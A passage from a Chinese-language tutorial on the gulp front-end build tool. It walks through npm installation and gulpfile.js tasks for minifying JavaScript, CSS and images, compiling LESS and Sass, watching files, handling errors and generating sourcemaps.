并在命令行运行了 gulp 则需要使用 Ctrl + C 退出任务。\n2.8 npm 模块管理器\n如果你了解 npm 则跳过此章节\n若你不了解npm 请阅读 npm模块管理器\n2.9 安装 gulp\nnpm 是 node&#96;&#96; 的包管理工具，可以利用它安装 gulp 所需的包。（在安装 node 时已经自动安装了 npm）\n在命令行输入\nnpm install -g gulp\n\n若一直没安装成功，请使用 cnpm 安装(npm的国内加速镜像)\n意思是：使用 npm 安装全局性的(-g) gulp 包。\n\n如果你安装失败，请输入sudo npm install -g gulp使用管理员权限安装。（可能会要求输入密码）\n\n安装时请注意命令行的提示信息，安装完成后可在命令行输入 gulp -v 以确认安装成功。\n至此，我们完成了准备工作。接着让 gulp开始帮我们干活吧！\n三、使用 gulp 压缩 JS\n压缩js 代码可降低 js 文件大小，提高页面打开速度。在不利用 gulp 时我们需要通过各种工具手动完成压缩工作。\n所有的 gulp 代码编写都可以看做是将规律转化为代码的过程。\n\n规律\n\n找到 js/ 目录下的所有js 文件，压缩它们，将压缩后的文件存放在 dist/js/ 目录下。\n\ngulp 代码\n\ngulp 的所有配置代码都写在 gulpfile.js 文件。\n3.1 新建一个 gulpfile.js 文件\nchapter2└── gulpfile.js\n\n3.2 在 gulpfile.js 中编写代码\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)\n\n\nrequire() 是 node （CommonJS）中获取模块的语法。\n在 gulp 中你只需要理解 require() 可以获取模块。\n\n\n3.3 获取 gulp-uglify 组件\n// 获取 uglify 模块（用于压缩 JS）var uglify = require(&#x27;gulp-uglify&#x27;)\n\n\n3.4 创建压缩任务\n// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task(&#x27;script&#x27;, function() &#123;    // 1. 找到文件    gulp.src(&#x27;js/*.js&#x27;)    // 2. 压缩文件        .pipe(uglify())    // 3. 另存压缩后的文件        .pipe(gulp.dest(&#x27;dist/js&#x27;))&#125;)\n\n\ngulp.task(name, fn) - 定义任务，第一个参数是任务名，第二个参数是任务内容。\ngulp.src(path) - 选择文件，传入参数是文件路径。\ngulp.dest(path) - 输出文件\ngulp.pipe() - 管道，你可以暂时将 pipe 理解为将操作加入执行队列\n\n参考：gulp API文档\n\n3.5 跳转至 gulpfile.js 所在目录\n打开命令行使用 cd 命令跳转至 gulpfile.js 文件所在目录。\n例如我的 gulpfile.js 文件保存在 C:\\gulp-book\\demo\\chapter2\\gulpfile.js。\n那么就需要在命令行输入\ncd C:\\gulp-book\\demo\\chapter2\n\n\n\n\nMac 用户可使用 cd Documents/gulp-book/demo/chapter2/ 跳转\n\n\n3.6 使用命令行运行 script 任务\n在控制台输入 gulp 任务名 可运行任务，此处我们输入 gulp script 回车。\n注意：输入 gulp script 后命令行将会提示错误信息\n// 在命令行输入gulp scriptError: Cannot find module &#x27;gulp-uglify&#x27;    at Function.Module._resolveFilename (module.js:338:15)    at Function.Module._load (module.js:280:25)\n\n\n\nCannot find module &#39;gulp-uglify&#39; 没有找到 gulp-uglify 模块。\n\n3.7 安装 gulp-uglify 模块\n因为我们并没有安装 gulp-uglify 模块到本地，所以找不到此模块。\n使用 npm 安装 gulp-uglify 到本地\nnpm install gulp-uglify\n\n安装成功后你会看到如下信息：\ngulp-uglify@1.1.0 node_modules/gulp-uglify├── deepmerge@0.2.7├── uglify-js@2.4.16 (uglify-to-browserify@1.0.2, async@0.2.10, source-map@0.1.34, optimist@0.3.7)├── vinyl-sourcemaps-apply@0.1.4 (source-map@0.1.43)├── through2@0.6.3 (xtend@4.0.0, readable-stream@1.0.33)└── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, object-assign@2.0.0, lodash._reinterpolate@3.0.0, lodash._reescape@3.0.0, lodash._reevaluate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, chalk@1.0.0, lodash.template@3.3.2, vinyl@0.4.6, multipipe@0.1.2, dateformat@1.0.11)chapter2 $\n\n\n\n在你的文件夹中会新增一个 node_modules 文件夹，这里面存放着 npm 安装的模块。\n目录结构：\n├── gulpfile.js└── node_modules\t└── gulp-uglify\n\n\n\n接着输入 gulp script 执行任务\ngulp script[13:34:57] Using gulpfile ~/Documents/code/gulp-book/demo/chapter2/gulpfile.js[13:34:57] Starting &#x27;script&#x27;...[13:34:57] Finished &#x27;script&#x27; after 6.13 ms\n\n\n3.8 编写 js 文件\n我们发现 gulp 没有进行任何压缩操作。因为没有js这个目录，也没有 js 目录下的 .js 后缀文件。\n创建 a.js 文件，并编写如下内容\n// a.jsfunction demo (msg) &#123;    alert(&#x27;--------\\r\\n&#x27; + msg + &#x27;\\r\\n--------&#x27;)&#125;demo(&#x27;Hi&#x27;)\n\n目录结构：\n├── gulpfile.js├──  js│\t└── a.js└── node_modules\t└── gulp-uglify\n\n\n\n接着在命令行输入 gulp script 执行任务\ngulp 会在命令行当前目录下创建 dist/js/ 文件夹，并创建压缩后的 a.js 文件。\n目录结构：\n├── gulpfile.js├──  js│\t└── a.js├──  dist│\t└── js│\t\t└── a.js└── node_modules\t└── gulp-uglify\n\n\n\ndist&#x2F;js&#x2F;a.js\nfunction demo(n)&#123;alert(&quot;--------\\r\\n&quot;+n+&quot;\\r\\n--------&quot;)&#125;demo(&quot;Hi&quot;);\n\n\n\n\n3.9 检测代码修改自动执行任务\njs/a.js一旦有修改 就必须重新在命令行输入 gulp script ，这很麻烦。\n可以使用 gulp.watch(src, fn) 检测指定目录下文件的修改后执行任务。\n在 gulpfile.js 中编写如下代码：\n// 监听文件修改，当文件被修改则执行 script 任务gulp.watch(&#x27;js/*.js&#x27;, [&#x27;script&#x27;]);\n\n\n\n但是没有命令可以运行 gulp.watch()，需要将 gulp.watch() 包含在一个任务中。\n// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 script 任务    gulp.watch(&#x27;js/*.js&#x27;, [&#x27;script&#x27;])&#125;)\n\n接着在命令行输入 gulp auto，自动监听 js/*.js 文件的修改后压缩js。\n$gulp auto[21:09:45] Using gulpfile ~/Documents/code/gulp-book/demo/chapter2/gulpfile.js[21:09:45] Starting &#x27;auto&#x27;...[21:09:45] Finished &#x27;auto&#x27; after 9.19 ms\n\n此时修改 js/a.js 中的代码并保存。命令行将会出现提示，表示检测到文件修改并压缩文件。\n[21:11:01] Starting &#x27;script&#x27;...[21:11:01] Finished &#x27;script&#x27; after 2.85 ms\n\n至此，我们完成了 gulp 压缩 js 文件的自动化代码编写。\n注意：使用 gulp.watch 后你的命令行会进入“运行”状态，此时你不可以在命令行进行其他操作。可通过 Ctrl + C 停止 gulp。\n\nMac 下使用 control + C 停止 gulp\n\n3.10 使用 gulp.task(‘default’, fn) 定义默认任务\n增加如下代码\ngulp.task(&#x27;default&#x27;, [&#x27;script&#x27;, &#x27;auto&#x27;]);\n\n此时你可以在命令行直接输入 gulp +回车，运行 script 和 auto 任务。\n最终代码如下：\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)// 获取 uglify 模块（用于压缩 JS）var uglify = require(&#x27;gulp-uglify&#x27;)// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task(&#x27;script&#x27;, function() &#123;    // 1. 找到文件    gulp.src(&#x27;js/*.js&#x27;)    // 2. 压缩文件        .pipe(uglify())    // 3. 另存压缩后的文件        .pipe(gulp.dest(&#x27;dist/js&#x27;))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 script 任务    gulp.watch(&#x27;js/*.js&#x27;, [&#x27;script&#x27;])&#125;)// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 script 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;script&#x27;, &#x27;auto&#x27;])\n\n去除注释后，你会发现只需要 11 行代码就可以让 gulp 自动监听 js 文件的修改后压缩代码。但是还有还有一些性能问题和缺少容错性，将在后面的章节详细说明。\n你可以访问 gulp-uglify 以查看更多用法。\n四、使用 gulp 压缩 CSS\n压缩 css 代码可降低 css 文件大小，提高页面打开速度。\n我们接着将规律转换为 gulp 代码\n\n规律\n\n找到 css/ 目录下的所有 css 文件，压缩它们，将压缩后的文件存放在 dist/css/ 目录下。\n4.1 安装 gulp-minify-css模块\n提示：你需要使用命令行的 cd 切换到对应目录后进行安装操作。\n在命令行输入\nnpm install gulp-minify-css\n\n安装成功后你会看到如下信息：(安装时间可能会比较长)\ngulp-minify-css@1.0.0 node_modules/gulp-minify-css├── object-assign@2.0.0├── vinyl-sourcemaps-apply@0.1.4 (source-map@0.1.43)├── clean-css@3.1.8 (commander@2.6.0, source-map@0.1.43)├── through2@0.6.3 (xtend@4.0.0, readable-stream@1.0.33)├── vinyl-bufferstream@1.0.1 (bufferstreams@1.0.1)└── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, lodash._reescape@3.0.0, lodash._reinterpolate@3.0.0, lodash._reevaluate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, multipipe@0.1.2, vinyl@0.4.6, chalk@1.0.0, lodash.template@3.3.2, dateformat@1.0.11)\n\n4.2 参照 [使用 gulp 压缩 JS]创建 gulpfile.js 文件编写代码\n在对应目录创建 gulpfile.js 文件并写入如下内容：\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)// 获取 minify-css 模块（用于压缩 CSS）var minifyCSS = require(&#x27;gulp-minify-css&#x27;)// 压缩 css 文件// 在命令行使用 gulp css 启动此任务gulp.task(&#x27;css&#x27;, function () &#123;    // 1. 找到文件    gulp.src(&#x27;css/*.css&#x27;)    // 2. 压缩文件        .pipe(minifyCSS())    // 3. 另存为压缩文件        .pipe(gulp.dest(&#x27;dist/css&#x27;))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 css 任务    gulp.watch(&#x27;css/*.css&#x27;, [&#x27;css&#x27;])&#125;);// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 css 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;css&#x27;, &#x27;auto&#x27;])\n\n你可以访问 gulp-minify-css 以查看更多用法。\n\n4.3 创建 css 文件\n在 gulpfile.js 对应目录创建 css 文件夹，并在 css/ 目录下创建 a.css 文件。\n/* a.css */body a&#123;    color:pink;&#125;\n\n\n4.4 运行 gulp 查看效果\n在命令行输入 gulp +回车\n你将看到命令行出现如下提示\ngulp[17:01:19] Using gulpfile ~/Documents/code/gulp-book/demo/chapter3/gulpfile.js[17:01:19] Starting &#x27;css&#x27;...[17:01:19] Finished &#x27;css&#x27; after 6.21 ms[17:01:19] Starting &#x27;auto&#x27;...[17:01:19] Finished &#x27;auto&#x27; after 5.42 ms[17:01:19] Starting &#x27;default&#x27;...[17:01:19] Finished &#x27;default&#x27; after 5.71 μs\n\ngulp 会创建 dist/css 目录，并创建 a.css 文件，此文件存放压缩后的 css 代码。dist&#x2F;css&#x2F;a.css\n五、使用 gulp 压缩图片\n压缩 图片文件可降低文件大小，提高图片加载速度。\n找到规律转换为 gulp 代码\n\n规律\n\n找到 images/ 目录下的所有文件，压缩它们，将压缩后的文件存放在 dist/images/ 目录下。\n5.1 安装 gulp-imagemin 模块\n提示：你需要使用命令行的 cd 切换至对应目录再进行安装操作和 gulp 启动操作。\n在命令行输入\nnpm install gulp-imagemin\n\n安装成功后你会看到如下信息：(安装时间可能会比较长)\ngulp-imagemin@2.2.1 node_modules/gulp-imagemin├── object-assign@2.0.0├── pretty-bytes@1.0.3 (get-stdin@4.0.1)├── chalk@1.0.0 (escape-string-regexp@1.0.3, ansi-styles@2.0.1, supports-color@1.3.1, has-ansi@1.0.3, strip-ansi@2.0.1)├── through2-concurrent@0.3.1 (through2@0.6.3)├── gulp-util@3.0.4 (array-differ@1.0.0, beeper@1.0.0, array-uniq@1.0.2, lodash._reevaluate@3.0.0, lodash._reescape@3.0.0, lodash._reinterpolate@3.0.0, replace-ext@0.0.1, minimist@1.1.1, vinyl@0.4.6, through2@0.6.3, multipipe@0.1.2, lodash.template@3.3.2, dateformat@1.0.11)└── imagemin@3.1.0 (get-stdin@3.0.2, optional@0.1.3, vinyl@0.4.6, through2@0.6.3, stream-combiner@0.2.1, concat-stream@1.4.7, meow@2.1.0, vinyl-fs@0.3.13, imagemin-svgo@4.1.2, imagemin-optipng@4.2.0, imagemin-jpegtran@4.1.0, imagemin-pngquant@4.0.0, imagemin-gifsicle@4.1.0)\n\n5.2 创建 gulpfile.js 文件编写代码\n在对应目录创建 gulpfile.js 文件并写入如下内容：\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;);// 获取 gulp-imagemin 模块var imagemin = require(&#x27;gulp-imagemin&#x27;)// 压缩图片任务// 在命令行输入 gulp images 启动此任务gulp.task(&#x27;images&#x27;, function () &#123;    // 1. 找到图片    gulp.src(&#x27;images/*.*&#x27;)    // 2. 压缩图片        .pipe(imagemin(&#123;            progressive: true        &#125;))    // 3. 另存图片        .pipe(gulp.dest(&#x27;dist/images&#x27;))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 images 任务    gulp.watch(&#x27;images/*.*)&#x27;, [&#x27;images&#x27;])&#125;);// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 images 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;images&#x27;, &#x27;auto&#x27;])\n\n你可以访问 gulp-imagemin 以查看更多用法。\n\n5.3 在 images/ 目录下存放图片\n在 gulpfile.js 对应目录创建 images 文件夹，并在 images/ 目录下存放图片。\n5.4 运行 gulp 查看效果\n在命令行输入 gulp +回车\n你将看到命令行出现如下提示\ngulp[18:10:42] Using gulpfile ~/Documents/code/gulp-book/demo/chapter4/gulpfile.js[18:10:42] Starting &#x27;images&#x27;...[18:10:42] Finished &#x27;images&#x27; after 5.72 ms[18:10:42] Starting &#x27;auto&#x27;...[18:10:42] Finished &#x27;auto&#x27; after 6.39 ms[18:10:42] Starting &#x27;default&#x27;...[18:10:42] Finished &#x27;default&#x27; after 5.91 μs[18:10:42] gulp-imagemin: Minified 3 images (saved 25.83 kB - 5.2%)\n\n使用 gulp 编译 LESS\nLess 是一门 CSS 预处理语言，它扩充了 CSS 语言，增加了诸如变量、混合（mixin）、函数等功能，让 CSS 更易维护。\n\n安装npm install gulp-less\n\n基本用法// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)// 获取 gulp-less 模块var less = require(&#x27;gulp-less&#x27;)// 编译less// 在命令行输入 gulp less 启动此任务gulp.task(&#x27;less&#x27;, function () &#123;    // 1. 找到 less 文件    gulp.src(&#x27;less/**.less&#x27;)    // 2. 编译为css        .pipe(less())    // 3. 另存文件        .pipe(gulp.dest(&#x27;dist/css&#x27;))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 less 任务    gulp.watch(&#x27;less/**.less&#x27;, [&#x27;less&#x27;])&#125;)// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 less 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;less&#x27;, &#x27;auto&#x27;])\n\n你可以访问 gulp-less 以查看更多用法。\nLESS 代码和编译后的CSS代码less&#x2F;a.less\n.less&#123;\ta&#123;        color:pink;    &#125;&#125;\n\nless&#x2F;import.less\n@import &quot;a.less&quot;;.import&#123;\ta&#123;\t\tcolor:red;    &#125;&#125;\n\nless&#x2F;a.css\n.less a &#123;  color: pink;&#125;\n\nless&#x2F;import.css\n.less a &#123;  color: pink;&#125;.import a&#123;  color: red;&#125;\n\n六、使用 gulp 编译 Sass\n\n无论是 node-sass 还是 ruby-sass 使用 npm 安装都非常的慢，甚至会装不上。及其不利于团队协作。建议使用 less 作为 css 预处理器。如果因为 less 不支持自定义函数选择用 sass 可以使用 less-plugin-functions 让 less 支持自定义函数。\n\n6.1 gulp-sass\n本章使用的是 ruby-sass 如果你不方便安装 ruby 或编译速度慢，建议使用 gulp-sass\n\nSass 是一种 CSS 的开发工具，提供了许多便利的写法，大大节省了开发者的时间，使得 CSS 的开发，变得简单和可维护。\n\n本章使用 ruby-sass 编译 css,若你没有安装 ruby 和 sass 请移步 使用ruby.taobao安装 Sass\n6.2 安装\nnpm install gulp-ruby-sass\n\n6.3 基本用法\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)// 获取 gulp-ruby-sass 模块var sass = require(&#x27;gulp-ruby-sass&#x27;)// 编译sass// 在命令行输入 gulp sass 启动此任务gulp.task(&#x27;sass&#x27;, function() &#123;    return sass(&#x27;sass/&#x27;)     .on(&#x27;error&#x27;, function (err) &#123;      console.error(&#x27;Error!&#x27;, err.message);   &#125;)    .pipe(gulp.dest(&#x27;dist/css&#x27;))&#125;);// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 images 任务    gulp.watch(&#x27;sass/**/*.scss&#x27;, [&#x27;sass&#x27;])&#125;);// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 sass 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;sass&#x27;, &#x27;auto&#x27;])\n\nSass 代码和编译后的 CSS 代码\nsass&#x2F;a.scss\n.sass&#123;\ta&#123;        color:pink;    &#125;&#125;\n\nsass&#x2F;import.scss\n@import &quot;a.scss&quot;;.import&#123;\ta&#123;\t\tcolor:red;    &#125;&#125;\n\nsass&#x2F;a.css\n.sass a &#123;  color: pink;&#125;\n\nsass&#x2F;import.css\n.sass a &#123;  color: pink;&#125;.import a&#123;  color: red;&#125;\n\n七、使用 gulp 构建一个项目\n本章将介绍\n\ngulp-watch-path\nstream-combiner2\ngulp-sourcemaps\ngulp-autoprefixer\n\n并将之前所有章节的内容组合起来编写一个前端项目所需的 gulp 代码。\n若你不了解npm 请务必阅读 npm模块管理器\n7.1 package.json\n如果你熟悉 npm 则可以利用 package.json 保存所有 npm install --save-dev gulp-xxx 模块依赖和模块版本。\n在命令行输入\nnpm init\n\n会依次要求补全项目信息，不清楚的可以直接回车跳过\nname: (gulp-demo) version: (1.0.0) description: entry point: (index.js) test command: ......Is this ok? (yes)\n\n\n\n最终会在当前目录中创建 package.json 文件并生成类似如下代码：\n&#123;  &quot;name&quot;: &quot;gulp-demo&quot;,  &quot;version&quot;: &quot;0.0.0&quot;,  &quot;description&quot;: &quot;&quot;,  &quot;scripts&quot;: &#123;    &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;  &#125;,  &quot;repository&quot;: &#123;    &quot;type&quot;: &quot;git&quot;,    &quot;url&quot;: &quot;https://github.com/nimojs/gulp-demo.git&quot;  &#125;,  &quot;keywords&quot;: [    &quot;gulp&quot;,  ],  &quot;author&quot;: &quot;nimojs &lt;nimo.jser@gmail.com&gt;&quot;,  &quot;license&quot;: &quot;MIT&quot;,  &quot;bugs&quot;: &#123;    &quot;url&quot;: &quot;https://github.com/nimojs/gulp-demo/issues&quot;  &#125;,  &quot;homepage&quot;: &quot;https://github.com/nimojs/gulp-demo&quot;&#125;\n\n\n\n7.2 安装依赖\n安装 gulp 到项目（防止全局 gulp 升级后与此项目 gulpfile.js 代码不兼容）\nnpm install gulp --save-dev\n\n\n\n此时打开 package.json 会发现多了如下代码\n&quot;devDependencies&quot;: &#123;\t&quot;gulp&quot;: &quot;^3.8.11&quot;&#125;\n\n声明此项目的开发依赖 gulp\n接着安装其他依赖：\n\n安装模块较多，请耐心等待，若一直安装失败可使用npm.taobao.org\n\nnpm install gulp-uglify gulp-watch-path stream-combiner2 gulp-sourcemaps gulp-minify-css gulp-autoprefixer gulp-less gulp-ruby-sass gulp-imagemin gulp-util --save-dev\n\n此时，package.json 将会更新\n&quot;devDependencies&quot;: &#123;    &quot;colors&quot;: &quot;^1.0.3&quot;,    &quot;gulp&quot;: &quot;^3.8.11&quot;,    &quot;gulp-autoprefixer&quot;: &quot;^2.1.0&quot;,    &quot;gulp-imagemin&quot;: &quot;^2.2.1&quot;,    &quot;gulp-less&quot;: &quot;^3.0.2&quot;,    &quot;gulp-minify-css&quot;: &quot;^1.0.0&quot;,    &quot;gulp-ruby-sass&quot;: &quot;^1.0.1&quot;,    &quot;gulp-sourcemaps&quot;: &quot;^1.5.1&quot;,    &quot;gulp-uglify&quot;: &quot;^1.1.0&quot;,    &quot;gulp-watch-path&quot;: &quot;^0.0.7&quot;,    &quot;stream-combiner2&quot;: &quot;^1.0.2&quot;&#125;\n\n\n\n当你将这份 gulpfile.js 配置分享给你的朋友时，就不需要将 node_modules/ 发送给他，他只需在命令行输入\nnpm install\n\n\n\n就可以检测 package.json 中的 devDependencies 并安装所有依赖。\n7.3 设计目录结构\n我们将文件分为2类，一类是源码，一类是编译压缩后的版本。文件夹分别为 src 和 dist。(注意区分 dist 和 ·dest 的区别)\n└── src/│└── dist/\n\ndist/ 目录下的文件都是根据 src/ 下所有源码文件构建而成。\n在 src/ 下创建前端资源对应的的文件夹\n└── src/\t├── less/    *.less 文件\t├── sass/    *.scss *.sass 文件\t├── css/     *.css  文件\t├── js/      *.js 文件\t├── fonts/   字体文件    └── images/   图片└── dist/\n\n7.4 让命令行输出的文字带颜色\ngulp 自带的输出都带时间和颜色，这样很容易识别。我们利用 gulp-util 实现同样的效果。\nvar gulp = require(&#x27;gulp&#x27;)var gutil = require(&#x27;gulp-util&#x27;)gulp.task(&#x27;default&#x27;, function () &#123;    gutil.log(&#x27;message&#x27;)    gutil.log(gutil.colors.red(&#x27;error&#x27;))    gutil.log(gutil.colors.green(&#x27;message:&#x27;) + &quot;some&quot;)&#125;)\n\n使用 gulp 启动默认任务以测试\n7.5 配置 JS 任务7.5.1 gulp-uglify检测src/js/目录下的 js 文件修改后，压缩 js/ 中所有 js 文件并输出到 dist/js/ 中\nvar uglify = require(&#x27;gulp-uglify&#x27;)gulp.task(&#x27;uglifyjs&#x27;, function () &#123;    gulp.src(&#x27;src/js/**/*.js&#x27;)        .pipe(uglify())        .pipe(gulp.dest(&#x27;dist/js&#x27;))&#125;)gulp.task(&#x27;default&#x27;, function () &#123;    gulp.watch(&#x27;src/js/**/*.js&#x27;, [&#x27;uglifyjs&#x27;])&#125;)\n\nsrc/js/**/*.js 是 glob 语法。百度百科：glob模式 、node-glob\n在命令行输入 gulp 后会出现如下消息，表示已经启动。\n[20:39:50] Using gulpfile ~/Documents/code/gulp-book/demo/chapter7/gulpfile.js[20:39:50] Starting &#x27;default&#x27;...[20:39:50] Finished &#x27;default&#x27; after 13 ms\n\n\n\n此时编辑 src&#x2F;js&#x2F;log.js 文件并保存，命令行会出现如下消息，表示检测到 src/js/**/*.js 文件修改后重新编译所有 js。\n[20:39:52] Starting &#x27;js&#x27;...[20:39:52] Finished &#x27;js&#x27; after 14 ms\n\n7.5.2gulp-watch-path\n此配置有个性能问题，当 gulp.watch 检测到 src/js/ 目录下的js文件有修改时会将所有文件全部编译。实际上我们只需要重新编译被修改的文件。\n简单介绍 gulp.watch 第二个参数为 function 时的用法。\ngulp.watch(&#x27;src/js/**/*.js&#x27;, function (event) &#123;    console.log(event);    /*\t当修改 src/js/log.js 文件时    event &#123;\t\t// 发生改变的类型，不管是添加，改变或是删除        type: &#x27;changed&#x27;, \t\t// 触发事件的文件路径        path: &#x27;/Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.js&#x27;    &#125;    */&#125;)\n\n我们可以利用 event 给到的信息，检测到某个 js 文件被修改时，只编写当前修改的 js 文件。\n可以利用 gulp-watch-path 配合 event 获取编译路径和输出路径。\nvar watchPath = require(&#x27;gulp-watch-path&#x27;)gulp.task(&#x27;watchjs&#x27;, function () &#123;    gulp.watch(&#x27;src/js/**/*.js&#x27;, function (event) &#123;        var paths = watchPath(event, &#x27;src/&#x27;, &#x27;dist/&#x27;)        /*        paths            &#123; srcPath: &#x27;src/js/log.js&#x27;,              srcDir: &#x27;src/js/&#x27;,              distPath: &#x27;dist/js/log.js&#x27;,              distDir: &#x27;dist/js/&#x27;,              srcFilename: &#x27;log.js&#x27;,              distFilename: &#x27;log.js&#x27; &#125;        */\t\tgutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        gulp.src(paths.srcPath)            .pipe(uglify())            .pipe(gulp.dest(paths.distDir))    &#125;)&#125;)gulp.task(&#x27;default&#x27;, [&#x27;watchjs&#x27;])\n\nuse-gulp-watch-path 完整代码\n7.5.3 watchPath(event, search, replace, distExt)\n\n\n\n参数\n说明\n\n\n\nevent\ngulp.watch 回调函数的 event\n\n\nsearch\n需要被替换的起始字符串\n\n\nreplace\n第三个参数是新的的字符串\n\n\ndistExt\n扩展名(非必填)\n\n\n此时编辑 src&#x2F;js&#x2F;log.js 文件并保存，命令行会出现消息，表示检测到 src/js/log.js 文件修改后只重新编译 log.js。\n[21:47:25] changed src/js/log.js[21:47:25] Dist dist/js/log.js\n\n你可以访问 gulp-watch-path 了解更多。\n7.5.4 stream-combiner2\n编辑 log.js 文件时，如果文件中有 js 语法错误时，gulp 会终止运行并报错。\n当 log.js 缺少 )\nlog(&#x27;gulp-book&#x27;\n\n\n\n并保存文件时出现如下错误，但是错误信息不全面。而且还会让 gulp 停止运行。\nevents.js:85      throw er; // Unhandled &#x27;error&#x27; event            ^Error    at new JS_Parse_Error (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:189:18)......js_error (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp--book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:1165:20)    at maybe_unary (/Users/nimojs/Documents/code/gulp-book/demo/chapter7/node_modules/gulp-uglify/node_modules/uglify-js/lib/parse.js:1328:19)\n\n应对这种情况，我们可以使用 Combining streams to handle errors 文档中推荐的 stream-combiner2 捕获错误信息。\nvar handleError = function (err) &#123;    var colors = gutil.colors;    console.log(&#x27;\\n&#x27;)    gutil.log(colors.red(&#x27;Error!&#x27;))    gutil.log(&#x27;fileName: &#x27; + colors.red(err.fileName))    gutil.log(&#x27;lineNumber: &#x27; + colors.red(err.lineNumber))    gutil.log(&#x27;message: &#x27; + err.message)    gutil.log(&#x27;plugin: &#x27; + colors.yellow(err.plugin))&#125;var combiner = require(&#x27;stream-combiner2&#x27;)gulp.task(&#x27;watchjs&#x27;, function () &#123;    gulp.watch(&#x27;src/js/**/*.js&#x27;, function (event) &#123;        var paths = watchPath(event, &#x27;src/&#x27;, &#x27;dist/&#x27;)        /*        paths            &#123; srcPath: &#x27;src/js/log.js&#x27;,              srcDir: &#x27;src/js/&#x27;,              distPath: &#x27;dist/js/log.js&#x27;,              distDir: &#x27;dist/js/&#x27;,              srcFilename: &#x27;log.js&#x27;,              distFilename: &#x27;log.js&#x27; &#125;        */        gutil.log(gutil.colors.green(event.type) + &#x27; &#x27; + paths.srcPath)        gutil.log(&#x27;Dist &#x27; + paths.distPath)        var combined = combiner.obj([            gulp.src(paths.srcPath),            uglify(),            gulp.dest(paths.distDir)        ])        combined.on(&#x27;error&#x27;, handleError)    &#125;)&#125;)\n\n此时当编译错误的语法时，命令行会出现错误提示。而且不会让 gulp 停止运行。\nchanged:src/js/log.jsdist:dist/js/log.js--------------Error!fileName: /Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.jslineNumber: 7message: /Users/nimojs/Documents/code/gulp-book/demo/chapter7/src/js/log.js: Unexpected token eof «undefined», expected punc «,»plugin: gulp-uglify\n\n7.5.5 gulp-sourcemaps\nJS 压缩前和压缩后比较\n// 压缩前var log = function (msg) &#123;    console.log(&#x27;--------&#x27;);    console.log(msg)    console.log(&#x27;--------&#x27;);&#125;log(&#123;a:1&#125;)log(&#x27;gulp-book&#x27;)// 压缩后var log=function(o)&#123;console.log(&quot;--------&quot;),console.log(o),console.log(&quot;--------&quot;)&#125;;log(&#123;a:1&#125;),log(&quot;gulp-book&quot;);\n\n\n\n压缩后的代码不存在换行符和空白符，导致出错后很难调试，好在我们可以使用 sourcemap 帮助调试\nvar sourcemaps = require(&#x27;gulp-sourcemaps&#x27;)// ...var combined = combiner.obj([    gulp.src(paths.srcPath),    sourcemaps.init(),    uglify(),    sourcemaps.write(&#x27;./&#x27;),    gulp.dest(paths.distDir)])// ...\n\n此时 dist/js/ 中也会生成对应的 .map 文件，以便使用 Chrome 控制台调试代码 在线文件示例：src&#x2F;js&#x2F;\n\n至此，我们完成了检测文件修改后压缩 JS 的 gulp 任务配置。\n有时我们也需要一次编译所有 js 文件。可以配置 uglifyjs 任务。\ngulp.task(&#x27;uglifyjs&#x27;, function () &#123;    var combined = combiner.obj([        gulp.src(&#x27;src/js/**/*.js&#x27;),        sourcemaps.init(),        uglify(),        sourcemaps.write(&#x27;./&#x27;),        gulp.dest(&#x27;dist/js/&#x27;)    ])    combined.on(&#x27;error&#x27;, handleError)&#125;)\n\n在命令行输入 gulp uglifyjs 以压缩 src/js/ 下的所有 js 文件。\n7.6 配置 CSS 任务\n有时我们不想使用 LESS 或 SASS而是直接编写 CSS，但我们需要压缩 CSS 以提高页面加载速度。\n7.6.1 gulp-minify-css\n按照本章中压缩 JS 的方式，先编写 watchcss 任务\nvar minifycss = require(&#x27;gulp-minify-css&#x27;)gulp.task(&#x27;watchcss&#x27;, function () &#123;    gulp.watch(&#x27;src/css/**/*.css&#x27;, function (event) &#123;        var paths = watchPath(event, 